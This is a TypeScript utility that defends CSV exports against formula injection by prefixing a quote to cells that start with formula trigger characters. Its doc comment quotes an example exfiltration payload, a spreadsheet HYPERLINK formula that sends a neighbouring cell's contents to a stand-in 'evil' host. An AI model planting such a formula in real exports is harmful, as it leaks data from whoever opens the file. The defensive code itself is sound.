/**
 * CSV formula-injection neutralizer.
 *
 * Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc)
 * evaluate any cell beginning with =, +, -, @, tab, or carriage return
 * as a formula. A user-controlled string like `=HYPERLINK("http://evil/?p="&A1,"x")`
 * embedded in an exported CSV becomes an active formula that exfiltrates
 * neighbouring cell contents when an admin opens the file.
 *
 * `safeCsvCell` returns the input coerced to a string, prefixed with a
 * single quote (`'`) when the first character is a formula trigger. The
 * leading quote tells the spreadsheet to treat the cell as text.
 *
 * It does NOT quote-wrap or escape commas/newlines — that remains the
 * responsibility of the CSV serializer (e.g. `csvEscape` or `Papa.unparse`)
 * that consumes the cell value. Compose as `csvEscape(safeCsvCell(value))`.
 */
const FORMULA_CHARS = /^[=+\-@\t\r]/;

export const safeCsvCell = (value: unknown): string => {
  if (value === null || value === undefined) {
    return '';
  }
  const str =
    typeof value === 'string'
      ? value
      : typeof value === 'object'
        ? JSON.stringify(value)
        : String(value);
  if (FORMULA_CHARS.test(str)) {
    return `'${str}`;
  }
  return str;
};
